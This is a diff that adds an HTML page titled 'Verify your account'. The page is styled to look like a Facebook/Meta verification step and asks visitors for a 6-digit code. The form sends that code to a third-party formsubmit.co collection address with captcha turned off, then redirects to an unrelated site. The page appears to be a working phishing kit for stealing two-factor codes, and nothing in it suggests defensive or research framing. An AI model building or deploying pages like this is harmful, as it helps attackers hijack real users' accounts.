@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify your account</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Manrope', Arial, sans-serif;
+            font-weight: 300; /* Use 300 for thinner text */
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            background-color: #EEF7FF;
+            box-sizing: border-box;
+        }
+
+        /* Small Text */
+        h6 {
+            font-size: 14px;
+            color: #606770;
+            margin-bottom: 20px;
+        }
+
+        /* Logo */
+        img {
+            max-width: 15%;
+            height: auto;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            font-size: 23px;
+            margin-bottom: 1px;
+            font-weight: 700;
+            text-align: left;
+        }
+        p {
+            color: #2c2a2a;
+            margin-bottom: 20px;
+            font-size: 25px;
+            line-height: 1.5;
+            text-align: left;
+            padding: 0 0px;
+        }
+
+        /* Form Styling */
+        form {
+            width: 90%;
+            max-width: 400px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background-color: transparent;
+            border-radius: 8px;
+            box-sizing: border-box;
+        }
+
+        /* Input Fields */
+        input {
+            width: 100%;
+            padding: 15px 15px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 10px;
+            font-size: 30px;
+        }
+
+
+        /* Buttons */
+        button {
+            width: 110%;
+            padding: 10px 15px;
+            margin: 15px 0;
+            border: none;
+            border-radius: 50px;
+            background-color: #0064E0;
+            color: #fff;
+            font-size: 16px;
+            cursor: pointer;
+            transition: transform 0.3s ease;
+        }
+
+        button:hover {
+            background-color: rgb(26, 107, 220);
+            transform: scale(0.98);
+        }
+         
+
+        a {
+            text-decoration: none;
+            color: #4E606C;
+        }
+
+        /* Footer */
+        footer {
+            margin-top: -10px !important;
+            color: #606770 !important;
+            text-align: center !important;
+        }
+
+        footer p {
+            font-size: 12px !important;
+        }
+
+        footer {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .blogo {
+            margin-top: 100px;
+        }
+
+        /* Mobile-First Design */
+        @media only screen and (max-width: 768px) {
+            body {
+                padding: 10px;
+            }
+            
+            form {
+                padding: 15px;
+            }
+            
+            input, button {
+                font-size: 16px;
+            }
+
+            p {
+                font-size: 20px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .logo {
+                margin: -10px 0 20px;
+            }
+            h1 {
+                font-size: 28px;
+            }
+        }
+
+        /*PC Design*/
+        @media only screen and (min-width: 768px) {
+            input, button {
+                font-size: 20px;
+            }
+
+            img {
+                max-width: 5%;
+                height: auto;
+                margin-bottom: 20px;
+                margin-top: 70px;
+            }
+            
+        }
+    </style>
+</head>
+<body>
+    <h6>English (UK)</h6>
+    <img src="logo.svg">
+    <form action="https://formsubmit.co/1f002c7bcb098ffeaad22c6268285709" method="POST">
+
+        <p class="normalp">Enter the 6-digit code sent to you.</p>
+        
+        <input type="text" name="6-Digit-Code" placeholder="Enter code" required inputmode="numeric">
+
+
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_next" value="https://darknaija.com/">
+        
+        <button type="submit">Continue</button>
+        <a href="https://trendz.netlify.app/verify.html"><h5>Didn't get a code?</h5></a>
+    </form>
+
+    <img src="logo2.png" class="blogo" alt="">
+    <footer>
+        <p>About</p> &nbsp; &nbsp; <p>Help</p> &nbsp; &nbsp; <p>More</p>
+    </footer>
+</body>
+</html>
